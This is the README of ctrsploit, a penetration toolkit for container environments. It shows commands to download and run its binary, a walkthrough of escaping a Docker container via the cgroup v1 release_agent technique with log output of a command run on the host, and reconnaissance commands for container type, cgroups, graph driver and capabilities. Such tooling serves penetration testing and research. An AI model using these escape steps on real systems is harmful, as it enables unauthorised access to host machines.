# ctrsploit: A penetration toolkit for container environment

[中文文档](./README-ZH.md)

## usage

### help

```
wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
./ctrsploit --help
NAME:
   ctrsploit - A penetration toolkit for container environment

ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a     auto gathering information, and detect vuls, and exploit // TODO
   exploit, e  run a exploit
   env, e      gather information // TODO
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --lang value  language for the greeting (default: "english")
   --help, -h    show help (default: false)
```

### run a exploit

```
root@2aa13a052102:/# ./ctrsploit e
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

eg. : escape by 'cgroupv1-release_agent' tech.

```
root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

if we do not know the rootfs of container, ctrsploit can still escape by release agent tech

```
[root@container /]# ./ctrsploit e ra3 -c "cat /etc/hostname"
INFO[0000] trying 100                                   
INFO[0000] trying 200                                   
INFO[0000] trying 300                                   
INFO[0000] trying 400                                   
INFO[0000] trying 500                                   
...
INFO[0017] trying 11700                                 
INFO[0017] found /output140128693, success              
INFO[0018] 
===========start of result==============
cce-arm-euler28-30231
===========end of result============== 
```

### gather information

usage

```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env command [command options] [arguments...]

COMMANDS:
   where, w        detect whether you are in the container, and which type of the container
   graphdriver, g  detect graphdriver type and extend information
   cgroups, c      gather cgroup information
   help, h         Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)
```

where

```
root@ctr:/# ./ctrsploit  env  w
INFO[0000] ===========Docker=========
.dockerenv exists: ✔
rootfs contains 'docker': ✔
cgroup contains 'docker': ✘
the mount source of /etc/hosts contains 'docker': ✔
hostname match regex ^[0-9a-f]{12}$: ✔
=> is in docker: ✔ 
INFO[0000] ===========k8s=========
/var/run/secrets/kubernetes.io exists: ✘
hostname match k8s pattern: ✘
the mount source of /etc/hosts contains 'pods': ✘
cgroup contains 'kubepods': ✘
=> is in k8s: ✘ 
```

cgroup version

```
root@ctr:/# ./ctrsploit env c
INFO[0000] ===========Cgroups=========
is cgroupv1: ✘
is cgroupv2: ✔ 
```

graph driver

```
root@ctr:/# ./ctrsploit env g
INFO[0000] ===========Overlay=========
Overlay enabled: false 
INFO[0000] ===========DeviceMapper=========
DeviceMapper enabled: true
DeviceMapper used: true
The number of devicemapper used in running container: 11 ( =(count(running containers)+1) )
The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e845b55b8c9ec42034d7d2dcc23159ebd06f3c69983e764f26eab9721/rootfs 
```

capability

```
root@ctr:/# ./ctrsploit env cap
INFO[0000] ===========Capability=========
pid 1
[caps]
0xa82425fb != default(0xa80425fb)

[parsed]
[CAP_CHOWN CAP_DAC_OVERRIDE CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_NET_BIND_SERVICE CAP_NET_RAW CAP_SYS_CHROOT CAP_SYS_ADMIN CAP_MKNOD CAP_AUDIT_WRITE CAP_SETFCAP]

[Additional Capabilities]
["CAP_SYS_ADMIN"]

current process
[caps]
0xa82425fb != default(0xa80425fb)

[parsed]
[CAP_CHOWN CAP_DAC_OVERRIDE CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_NET_BIND_SERVICE CAP_NET_RAW CAP_SYS_CHROOT CAP_SYS_ADMIN CAP_MKNOD CAP_AUDIT_WRITE CAP_SETFCAP]

[Additional Capabilities]
["CAP_SYS_ADMIN"]
```

## pre-built release

https://github.com/ssst0n3/ctrsploit/releases

## Todo List

see [FEATURES.md](./FEATURES.md)